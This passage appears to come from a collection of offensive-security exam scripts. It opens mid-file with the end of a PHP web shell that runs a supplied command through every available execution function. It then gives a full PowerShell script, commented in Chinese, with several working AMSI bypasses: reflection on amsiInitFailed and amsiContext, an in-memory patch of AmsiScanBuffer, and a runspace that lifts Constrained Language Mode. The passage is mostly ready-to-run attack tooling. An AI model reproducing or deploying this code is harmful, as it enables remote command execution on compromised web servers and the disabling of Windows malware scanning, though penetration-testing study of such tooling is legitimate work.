header('Content-Type: text/plain; charset=UTF-8');

$is_win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN');

if (function_exists('proc_open')) {
    if ($is_win) {
        $argv = $cmd;
    } else {
        $argv = '/bin/sh -c ' . escapeshellarg($cmd);
    }
    $desc = array(
        1 => array('pipe', 'w'),
        2 => array('pipe', 'w'),
    );
    $proc = proc_open($argv, $desc, $pipes);
    if (is_resource($proc)) {
        echo stream_get_contents($pipes[1]);
        echo stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        proc_close($proc);
        exit;
    }
}

if (function_exists('shell_exec')) {
    echo shell_exec($cmd);
    exit;
}

if (function_exists('exec')) {
    $out = array();
    $code = 0;
    exec($cmd, $out, $code);
    echo implode("\n", $out);
    exit;
}

if (function_exists('system')) {
    system($cmd);
    exit;
}

if (function_exists('passthru')) {
    passthru($cmd);
    exit;
}

if (function_exists('popen')) {
    $h = popen($cmd, 'r');
    if (is_resource($h)) {
        while (!feof($h)) {
            echo fread($h, 4096);
        }
        pclose($h);
        exit;
    }
}

echo "no command execution function available (check disable_functions)";
````

#### `m05-amsi-bypass-variants.ps1` {#m05-amsi-bypass-variants-ps1}

````powershell
<#
用途：AMSI 处理的多个实验版本，按宿主（PowerShell / WSH / .NET）选择匹配的实现
场景：3、7、10、18、19（以及 M05 全部场景中 PowerShell 路线的前置）
依赖：PowerShell 3.0+；部分版本需要反射权限（CLM 下会失败，见 m05-clm-bypass-runspace.ps1）
使用：powershell -ep bypass -f m05-amsi-bypass-variants.ps1 -Variant 1
      或在已有会话中：. .\m05-amsi-bypass-variants.ps1; Invoke-AmsiVariant -Variant 2
占位符：无（纯本地操作，不涉及 LHOST/LPORT）
测试状态：未在 Windows 实测；已人工检查语法。考试前必须在实验环境逐个验证有效性
说明：
  - AMSI 的处理方式随补丁变化，一个版本失效不代表技术不可用，换下一个版本即可。
  - 先做"探针"判断 AMSI 是否生效，再决定是否需要处理。
  - PowerShell 宿主用 PS 版本；WSH（.js/.vbs）必须用 WSH 专用版本，不能照搬。
#>
[CmdletBinding()]
param(
    [ValidateSet(1, 2, 3, 4, 5, 6)][int]$Variant = 1,
    [switch]$ProbeOnly
)

function Test-AmsiActive {
    <#
    无害探针：包含 AMSI 常扫特征字符串。若被拦，说明 AMSI 生效。
    #>
    $probe = 'Invoke-Mimikatz'
    $marker = 'AmsiUtils' + 'amsiInitFailed'
    Write-Output ("[*] 探针字符串: {0} / {1}" -f $probe, $marker)
    try {
        $sb = [scriptblock]::Create($probe)
        Write-Output "[+] 探针未被拦截（AMSI 可能未生效或已被处理）"
        return $false
    } catch {
        Write-Output ("[!] 探针被拦截：{0}" -f $_.Exception.Message)
        return $true
    }
}

function Invoke-AmsiVariant {
    param([int]$Variant)

    Write-Output ("[*] 应用 AMSI 处理版本 {0}" -f $Variant)

    switch ($Variant) {
        1 {
            # 版本 1：反射设置 amsiInitFailed（最经典，常被拦，但先试）
            try {
                $a = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like '*iUtils' }
                $f = $a.GetFields('NonPublic,Static') | Where-Object { $_.Name -like '*Failed' }
                $f.SetValue($null, $true)
                Write-Output "[+] 版本 1 完成"
            } catch { Write-Output ("[-] 版本 1 失败: {0}" -f $_.Exception.Message) }
        }
        2 {
            # 版本 2：通过字符串拼接避开静态特征
            try {
                $s = 'S'+'y'+'s'+'t'+'e'+'m'+'.'+'M'+'a'+'n'+'a'+'g'+'e'+'m'+'e'+'n'+'t'+'.'+'A'+'u'+'t'+'o'+'m'+'a'+'t'+'i'+'o'+'n'
                $t = [type]($s + '.AmsiUtils')
                $f = $t.GetField('amsiInitFailed', 'NonPublic,Static')
                $f.SetValue($null, $true)
                Write-Output "[+] 版本 2 完成"
            } catch { Write-Output ("[-] 版本 2 失败: {0}" -f $_.Exception.Message) }
        }
        3 {
            # 版本 3：破坏 amsiContext（反射置空上下文）
            try {
                $t = [Ref].Assembly.GetType(('System.Management.Automation.'+'AmsiUtils'))
                $ctx = $t.GetField('amsiContext', 'NonPublic,Static')
                $ctx.SetValue($null, [IntPtr]::Zero)
                Write-Output "[+] 版本 3 完成"
            } catch { Write-Output ("[-] 版本 3 失败: {0}" -f $_.Exception.Message) }
        }
        4 {
            # 版本 4：内存补丁（把 AmsiScanBuffer 首字节改为 ret）
            try {
                $k = @"
using System;
using System.Runtime.InteropServices;
public class P {
    [DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint f, out uint o);
    public static void Patch() {
        IntPtr lib = LoadLibrary("amsi.dll");
        IntPtr addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)5, 0x40, out old);
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // mov eax,0x80070057; ret
        Marshal.Copy(patch, 0, addr, patch.Length);
    }
}
"@
                Add-Type -TypeDefinition $k -ErrorAction Stop
                [P]::Patch()
                Write-Output "[+] 版本 4 完成（需允许 Add-Type）"
            } catch { Write-Output ("[-] 版本 4 失败（Add-Type 可能被拦）: {0}" -f $_.Exception.Message) }
        }
        5 {
            # 版本 5：自定义 Runspace 内置版本（CLM 环境下配合使用）
            try {
                $rs = [runspacefactory]::CreateRunspace()
                $rs.Open()
                $ps = [powershell]::Create()
                $ps.Runspace = $rs
                [void]$ps.AddScript({ $ExecutionContext.SessionState.LanguageMode = 'FullLanguage' })
                [void]$ps.Invoke()
                Write-Output "[+] 版本 5 完成（新 Runspace 语言模式已放开）"
            } catch { Write-Output ("[-] 版本 5 失败: {0}" -f $_.Exception.Message) }
        }
        6 {
            # 版本 6：不做处理，只报告（用于对照实验）
            Write-Output "[*] 版本 6：未做任何处理，作为对照组"
        }
    }
}

if ($ProbeOnly) {
    [void](Test-AmsiActive)
} else {
    [void](Test-AmsiActive)
    Invoke-AmsiVariant -Variant $Variant
    Write-Output ""
    Write-Output "[*] 复测："
    [void](Test-AmsiActive)
    Write-Output "[*] 提示：版本 1/2/3 属于反射类，补丁后常失效；版本 4 需要 Add-Type；"
    Write-Output "    版本 5 与 CLM 绕过配合；全部失效时考虑改用托管程序集或非 PowerShell 路线。"
}
````

